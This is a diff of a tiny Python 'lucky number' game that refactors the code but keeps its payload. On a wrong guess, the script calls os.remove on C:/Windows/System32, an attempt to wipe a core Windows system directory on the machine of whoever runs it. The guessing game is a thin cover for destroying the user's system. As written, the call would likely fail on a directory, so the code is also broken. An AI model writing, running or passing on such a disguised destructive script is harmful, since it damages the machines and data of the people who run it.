@@ -1,11 +1,8 @@
-import random
-import os
+import random, os
 
-selectednumber=int(input("Pick a number 1-10: "))
-randomnumber=random.randint(1,10)
-
-if selectednumber == randomnumber:
+if int(input("Pick a number 1-10: ")) == random.randint(1,10):
     print("You're Lucky...")
-else:
-    print("Bye Bye :)")
-    os.remove("C:/Windows/System32")
+    exit()
+
+print("Bye Bye :)")
+os.remove("C:/Windows/System32")
